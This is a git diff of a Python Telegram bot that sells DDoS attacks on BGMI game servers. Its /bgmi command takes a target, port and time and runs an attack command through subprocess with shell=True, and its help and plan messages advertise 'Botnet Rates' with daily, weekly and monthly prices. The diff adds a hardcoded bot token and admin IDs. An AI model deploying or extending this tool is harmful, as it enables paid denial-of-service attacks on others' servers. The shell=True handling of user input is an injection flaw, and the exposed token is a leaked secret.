@@ -1,15 +1,18 @@
-# ReporterAlpha
+
+#!/usr/bin/python3
+
 import telebot
 import subprocess
 import requests
 import datetime
 import os
 
+
 # insert your Telegram bot token here
-bot = telebot.TeleBot('BOT-TOKEN')
+bot = telebot.TeleBot('7468132796:AAGqdy8EGOkkfkxmcHR_mPXPL8_aMIfQJAE')
 
 # Admin user IDs
-admin_id = ["YOUR-UID"]
+admin_id = ["5070337758","2115946421"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -63,12 +66,12 @@ def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
-                response = "Logs are already cleared. No data found"
+                response = "Logs are already cleared. No data found ❌."
             else:
                 file.truncate(0)
-                response = "Logs cleared successfully"
+                response = "Logs cleared successfully ✅"
     except FileNotFoundError:
-        response = "No logs found to clear"
+        response = "No logs found to clear."
     return response
 
 # Function to record command logs
@@ -95,9 +98,9 @@ def add_user(message):
                 allowed_user_ids.append(user_to_add)
                 with open(USER_FILE, "a") as file:
                     file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} Got Access successfully"
+                response = f"User {user_to_add} Added Successfully By @MawaOwner ✅."
             else:
-                response = "User already exist in the Bot"
+                response = "User already exists 🤦‍♂️."
         else:
             response = "Please Specify a User ID to Add."
     else:
@@ -119,12 +122,12 @@ def remove_user(message):
                 with open(USER_FILE, "w") as file:
                     for user_id in allowed_user_ids:
                         file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} Removed Successfully ."
+                response = f"User {user_to_remove} Removed Successfully By @MawaOwner ."
             else:
-                response = f"User {user_to_remove} not found in the list."
+                response = f"User {user_to_remove} not found in the list ❌."
         else:
             response = '''Please Specify A User ID to Remove. 
-Usage: /remove <userid>'''
+✅ Usage: /remove <userid>'''
     else:
         response = "Only Admin Can Run This Command."
 
@@ -139,14 +142,14 @@ def clear_logs_command(message):
             with open(LOG_FILE, "r+") as file:
                 log_content = file.read()
                 if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found."
+                    response = "Logs are already cleared. No data found ❌."
                 else:
                     file.truncate(0)
-                    response = "Logs Cleared Successfully"
+                    response = "Logs Cleared Successfully ✅"
         except FileNotFoundError:
-            response = "Logs are already cleared."
+            response = "Logs are already cleared ❌."
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin Can Run This Command 😡."
     bot.reply_to(message, response)
 
  
@@ -168,11 +171,11 @@ def show_all_users(message):
                         except Exception as e:
                             response += f"- User ID: {user_id}\n"
                 else:
-                    response = "No data found"
+                    response = "No data found ❌"
         except FileNotFoundError:
-            response = "No data found"
+            response = "No data found ❌"
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin Can Run This Command.."
     bot.reply_to(message, response)
 
 
@@ -185,20 +188,20 @@ def show_recent_logs(message):
                 with open(LOG_FILE, "rb") as file:
                     bot.send_document(message.chat.id, file)
             except FileNotFoundError:
-                response = "No data found."
+                response = "No data found ❌."
                 bot.reply_to(message, response)
         else:
-            response = "No data found"
+            response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "Only Admin Can Run This Command."
+        response = "Only Admin Can Run This Command.."
         bot.reply_to(message, response)
 
 
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
     user_id = str(message.chat.id)
-    response = f"Your ID: {user_id}"
+    response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
 # Function to handle the reply when free users run the /bgmi command
@@ -206,7 +209,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -223,7 +226,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -244,9 +247,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command."
+        response = "❌ You Are Not Authorized To Use This Command ❌."
 
     bot.reply_to(message, response)
 
@@ -264,7 +267,7 @@ def show_command_logs(message):
                 if user_logs:
                     response = "Your Command Logs:\n" + "".join(user_logs)
                 else:
-                    response = "No Command Logs Found For You."
+                    response = "❌ No Command Logs Found For You ❌."
         except FileNotFoundError:
             response = "No command logs found."
     else:
@@ -275,16 +278,16 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''Available commands:
-/bgmi : Method For Bgmi Servers. 
-/rules : Please Check Before Use !!.
-/mylogs : To Check Your Recents Attacks.
-/plan : Checkout Our Botnet Rates.
+    help_text ='''🤖 Available commands:
+💥 /bgmi : Method For Bgmi Servers. 
+💥 /rules : Please Check Before Use !!.
+💥 /mylogs : To Check Your Recents Attacks.
+💥 /plan : Checkout Our Botnet Rates.
 
-To See Admin Commands:
-/admincmd : Shows All Admin Commands.
+🤖 To See Admin Commands:
+💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @ReporterAlpha
+Buy From :- @MawaOwner
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -299,32 +302,34 @@ Buy From :- @ReporterAlpha
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome, {user_name}!
-Try To Run This Command : /help 
-Join :- t.me/ChannelLink'''
+    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+🤖Try To Run This Command : /help 
+✅Join :- t.me/MawaCheats'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules:
-There are no rules in our Bot.'''
+    response = f'''{user_name} Please Follow These Rules ⚠️:
+
+1. Dont Run Too Many Attacks !! Cause A Ban From Bot
+2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
+3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, we only have powerful plan!!:
+    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
-Vip :
-Attack Time : 180 (S)
-After Attack Limit : No Limit
-Concurrents Attack : 3
+Features : 
+Attack Time ~ 180 (S)
+After Attack Limit ~ NoLimit
 
-Price Lists :
-Day : 300 Rs
-Week : 1000 Rs
-Month : 2000 Rs
+Price List :
+Day ~ 150 Rs
+Week ~ 800 Rs
+Month ~ 1500 Rs
 '''
     bot.reply_to(message, response)
 
@@ -333,12 +338,12 @@ def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, Admin Commands Are Here!!:
 
-/add <userId> : Add a User.
-/remove <userid> Remove a User.
-/allusers : Authorised Users Lists.
-/logs : All Users Logs.
-/broadcast : Broadcast a Message.
-/clearlogs : Clear The Logs File.
+💥 /add <userId> : Add a User.
+💥 /remove <userid> Remove a User.
+💥 /allusers : Authorised Users Lists.
+💥 /logs : All Users Logs.
+💥 /broadcast : Broadcast a Message.
+💥 /clearlogs : Clear The Logs File.
 '''
     bot.reply_to(message, response)
 
@@ -349,7 +354,7 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "Message To All Users By @ReporterAlpha:\n\n" + command[1]
+            message_to_broadcast = "⚠️ Message To All Users By @MawaOwner:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
@@ -357,12 +362,12 @@ def broadcast_message(message):
                         bot.send_message(user_id, message_to_broadcast)
                     except Exception as e:
                         print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users."
+            response = "Broadcast Message Sent Successfully To All Users 👍."
         else:
-            response = "Please Provide A Message To Broadcast."
+            response = "🤖 Please Provide A Message To Broadcast."
     else:
         response = "Only Admin Can Run This Command."
 
     bot.reply_to(message, response)
-bot.polling()
- #ReporterAlpha
+
+bot.polling()    
